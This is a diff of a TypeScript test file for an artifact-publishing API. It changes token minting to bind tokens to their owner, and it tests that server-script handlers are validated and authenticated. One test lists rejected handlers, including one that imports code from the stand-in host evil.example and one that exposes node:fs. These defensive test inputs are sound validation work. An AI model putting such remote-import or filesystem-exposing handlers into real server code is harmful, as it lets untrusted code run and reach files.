@@ -18,7 +18,7 @@ useAppHarness();
 afterEach(()=>{setLambdaProgramResolver(undefined);setServices({runner:undefined});});
 const markup=(n:number)=>`<Helmet><script>{\`export default () => "browser-only";\`}</script><script type="server">{\`export default input => ({version:${n},input});\`}</script></Helmet><p>Handler</p>`;
 it('API authenticates callers and pins only the published server handler, ignoring supplied code and identity',async()=>{
- const owner=await createUser({email:'mxmx_test_server_scripts@example.com'}),token=await mintToken('server-script');await claimToken(owner.id,token.token);
+ const owner=await createUser({email:'mxmx_test_server_scripts@example.com'}),token=await mintToken('server-script',owner.id);await claimToken(owner.id,token.token);
  const created=await publish(request('/api/artifacts',{method:'POST',token:token.token,json:{markup:markup(1)}}));expect(created.status,await created.clone().text()).toBe(201);const {id}=await created.json();
  const admitted:RunStart[]=[];
  const runner:RunnerService={start:vi.fn(async spec=>{admitted.push(spec);return {runId:'test-run'};}),getRun:vi.fn(),events:vi.fn(),cancel:vi.fn()};setServices({runner});
@@ -42,7 +42,7 @@ it('API authenticates callers and pins only the published server handler, ignori
  expect(await run({ok:true},{artifactbin:{call:async()=>({tables:{},errors:{}})}})).toEqual({version:1,input:{ok:true}});
 });
 it('rejects invalid server handlers during publication and keeps legacy untyped Lambda invocation',async()=>{
- const owner=await createUser({email:'mxmx_test_server_script_validation@example.com'}),token=await mintToken('server-script');await claimToken(owner.id,token.token);
+ const owner=await createUser({email:'mxmx_test_server_script_validation@example.com'}),token=await mintToken('server-script',owner.id);await claimToken(owner.id,token.token);
  for(const script of ['export const notAHandler = 1;', 'export default () => import("https://evil.example/module.js");', 'import fs from "node:fs"; export default () => fs;']){
   const response=await publish(request('/api/artifacts',{method:'POST',token:token.token,json:{markup:`<Helmet><script type="server">{${JSON.stringify(script)}}</script></Helmet><p>Invalid</p>`}}));
   expect(response.status,await response.clone().text()).toBe(400);expect(await response.json()).toMatchObject({error:'invalid_server_script'});
@@ -53,7 +53,7 @@ it('rejects invalid server handlers during publication and keeps legacy untyped 
 });
 
 it('never treats an explicitly browser-only default export as a server handler',async()=>{
- const owner=await createUser({email:'mxmx_test_browser_only_script@example.com'}),token=await mintToken('browser-only');await claimToken(owner.id,token.token);
+ const owner=await createUser({email:'mxmx_test_browser_only_script@example.com'}),token=await mintToken('browser-only',owner.id);await claimToken(owner.id,token.token);
  const response=await publish(request('/api/artifacts',{method:'POST',token:token.token,json:{markup:'<Helmet><script type="module">{`export default () => 42;`}</script></Helmet><p>Browser only</p>'}}));expect(response.status).toBe(201);const {id}=await response.json();
  const start=vi.fn(async()=>({runId:'should-not-start'}));setServices({runner:{start,getRun:vi.fn(),events:vi.fn(),cancel:vi.fn()}});
  expect((await invoke(request(`/api/artifacts/${id}/runs`,{method:'POST',actor:{userId:owner.id,credential:'session'},json:{requestId:'browser'}}),{params:Promise.resolve({id})})).status).toBe(400);expect(start).not.toHaveBeenCalled();
